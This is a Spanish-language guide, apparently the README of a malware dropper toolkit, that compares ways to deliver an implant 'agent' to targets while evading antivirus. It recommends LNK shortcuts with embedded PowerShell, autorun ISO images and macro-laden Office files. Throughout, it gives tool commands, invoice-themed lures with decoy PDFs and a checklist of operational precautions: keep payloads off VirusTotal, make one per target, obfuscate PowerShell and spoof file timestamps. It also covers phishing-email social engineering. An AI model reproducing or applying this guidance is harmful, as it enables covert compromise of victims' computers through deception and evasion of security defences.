# 🎯 Alternativas al EXE - Guía Rápida

## ❌ Problema con EXE

Los archivos `.exe` compilados con PyInstaller tienen **alta detección** por:
- ✅ Firma PyInstaller (`{PyInsObj}`)
- ✅ Payload Base64 embebido
- ✅ Behavioral analysis (creación de procesos)
- ✅ Heurística de AV

**Conclusión:** Incluso con ofuscación, los EXE siempre levantan sospechas.

---

## ✅ Alternativas Efectivas (Menor a Mayor Complejidad)

### 1️⃣ LNK + PowerShell Embebido ⭐ RECOMENDADO

**Ventajas:**
- ✅ **MUY BAJA** detección
- ✅ PowerShell nativo (no se descarga nada)
- ✅ Payload embebido en LNK (Base64)
- ✅ Icono personalizado
- ✅ Simple de crear

**Desventajas:**
- ⚠️ Si payload > 4KB puede necesitar archivo `.ps1` adicional
- ⚠️ PowerShell Execution Policy debe permitirlo (bypass incluido)

**Uso:**
```bash
# Crear LNK dropper
python lnk_dropper.py \
    --agent ../agent/target/release/agent.exe \
    --output Factura_Diciembre_2025.lnk \
    --icon pdf_icon.ico \
    --pdf documento_real.pdf

# Distribución
# Enviar solo Factura_Diciembre_2025.lnk al objetivo
# Usuario hace doble clic → PowerShell se ejecuta en background
```

**Detección:** ⭐⭐⭐⭐⭐ (5/5) - Windows Defender generalmente NO detecta

**Realismo:** Usuario ve icono PDF, doble clic abre el PDF real mientras agent se ejecuta

---

### 2️⃣ ISO con Autorun

**Ventajas:**
- ✅ Windows monta ISO automáticamente (doble clic)
- ✅ Autorun.inf ejecuta contenido
- ✅ Parece legítimo (carpeta con documentos)
- ✅ Puede incluir múltiples archivos (PDF, README, etc)

**Desventajas:**
- ⚠️ Requiere oscdimg.exe o genisoimage
- ⚠️ Windows 10/11 puede deshabilitar Autorun
- ⚠️ Tamaño más grande

**Uso:**
```bash
# Crear ISO dropper
python iso_dropper.py \
    --agent ../agent/target/release/agent.exe \
    --output Factura_2025.iso \
    --icon pdf_icon.ico \
    --pdf factura.pdf

# Distribución
# Enviar Factura_2025.iso
# Usuario doble clic → Windows monta como unidad D:
# Autorun ejecuta agent automáticamente
```

**Detección:** ⭐⭐⭐⭐ (4/5) - Menos común, buena evasión

**Realismo:** Usuario ve "unidad de disco" con documentos oficiales

---

### 3️⃣ Office Macro (DOCM/XLSM)

**Ventajas:**
- ✅ **MUY COMÚN** en entorno corporativo
- ✅ Usuarios acostumbrados a habilitar macros
- ✅ VBA ofuscado difícil de detectar
- ✅ Payload embebido en documento

**Desventajas:**
- ⚠️ Requiere que usuario habilite macros (mensaje amarillo)
- ⚠️ Proceso semi-manual (añadir macro en Office)
- ⚠️ Office 365 tiene protección mejorada

**Uso:**
```bash
# Crear documento Word con macro
python office_dropper.py \
    --agent ../agent/target/release/agent.exe \
    --output Factura_2025.docm \
    --type word

# El script genera:
# - Factura_2025.docx (base)
# - Factura_2025.vba (código macro)

# Manual:
# 1. Abrir .docx en Word
# 2. Alt+F11 → VBA Editor
# 3. Copiar código de .vba
# 4. Guardar como .docm

# Distribución
# Enviar Factura_2025.docm
# Usuario abre → "Habilitar contenido" → Macro ejecuta agent
```

**Detección:** ⭐⭐⭐ (3/5) - Microsoft mejorando detección de macros

**Realismo:** Factura corporativa que "requiere macros para ver formato completo"

---

## 📊 Comparativa Rápida

| Método | Detección AV | Facilidad Uso | Realismo | Recomendado |
|--------|--------------|---------------|----------|-------------|
| **EXE (PyInstaller)** | 🔴 ALTA | ✅ Muy fácil | ⚠️ Medio | ❌ NO |
| **LNK + PowerShell** | 🟢 MUY BAJA | ✅ Fácil | ✅ Alto | ✅ SÍ |
| **ISO Autorun** | 🟡 MEDIA | ⚠️ Medio | ✅ Alto | ✅ SÍ |
| **Office Macro** | 🟡 MEDIA-ALTA | ⚠️ Difícil | ✅ Muy Alto | ⚠️ Depende |

---

## 🚀 Recomendación Final

### Para máxima efectividad:

**1. Primera opción: LNK + PowerShell**
```bash
cd dropper
python lnk_dropper.py \
    --agent ../agent/target/release/agent.exe \
    --output "Factura Diciembre 2025.lnk" \
    --icon pdf_icon.ico \
    --pdf factura_real.pdf
```

**Por qué:**
- ✅ Menor detección (PowerShell legítimo)
- ✅ Payload embebido completo
- ✅ Un solo archivo
- ✅ Usuario no ve consola ni ventanas
- ✅ PDF se abre como decoy

### 2. Segunda opción: ISO (si LNK falla)

**Útil cuando:**
- 🔹 Quieres parecer más "profesional" (CD de facturación)
- 🔹 Necesitas incluir múltiples documentos de soporte
- 🔹 Objetivo tiene Autorun habilitado

### 3. Tercera opción: Office Macro (phishing corporativo)

**Útil cuando:**
- 🔹 Contexto corporativo (contabilidad, RR.HH.)
- 🔹 Usuarios acostumbrados a macros
- 🔹 Puedes crear documento realista

---

## ⚠️ Precauciones

### Antes de distribución:

1. **Testing obligatorio:**
   ```bash
   # Probar en VM con Windows Defender activado
   # Verificar que no hay alertas
   # Confirmar que agent conecta al C2
   ```

2. **NO SUBIR A VIRUSTOTAL**
   - Comparte con todos los vendors de AV
   - Quema el payload inmediatamente

3. **Usar payloads únicos:**
   - Generar nuevo dropper por cada objetivo
   - No reutilizar mismo archivo

4. **Contexto realista:**
   - Nombre de archivo apropiado: "Factura_Diciembre_2025" no "dropper123"
   - Icono correcto para el tipo de archivo
   - Contenido decoy (PDF/DOC) real y relevante

---

## 🛠️ Instalación de Dependencias

```bash
# Para LNK dropper
pip install pylnk3

# Para Office dropper
pip install python-docx openpyxl

# Para ISO dropper (Windows)
# Descargar Windows ADK: https://go.microsoft.com/fwlink/?linkid=2196127
# O usar: pip install pycdlib

# Para ISO dropper (Linux)
sudo apt install genisoimage
```

---

## 📚 Scripts Disponibles

```
dropper/
├── lnk_dropper.py         ⭐ LNK + PowerShell (RECOMENDADO)
├── iso_dropper.py         📀 ISO con Autorun
├── office_dropper.py      📄 Word/Excel con Macros
├── embedded_dropper.py    ❌ EXE con PyInstaller (NO recomendado)
├── enhance_av_evasion.py  🛡️ Mejoras post-compilación (para EXE)
└── quick_build.py         🚀 Build automático
```

---

## 💡 Tips Finales

### PowerShell Obfuscation (extra):
Si Windows Defender detecta el LNK, ofuscar más el PowerShell:

```powershell
# Usar Invoke-Obfuscation
git clone https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

### Metadata Spoofing:
Todos los archivos deben tener metadata realista:

```bash
# Cambiar timestamps (aparecer antiguos)
powershell (Get-Item "Factura.lnk").CreationTime = "01/12/2025 09:00:00"
powershell (Get-Item "Factura.lnk").LastWriteTime = "15/12/2025 14:30:00"
```

### Social Engineering:
El vector más importante:
- ✅ Email convincente (urgencia, autoridad)
- ✅ Nombre de archivo apropiado al contexto
- ✅ Timing correcto (fin de mes para facturas)
- ✅ Remitente creíble

---

**🎯 Conclusión:** Abandona los EXE compilados. LNK + PowerShell es tu mejor opción para evasión de AV en 2025.
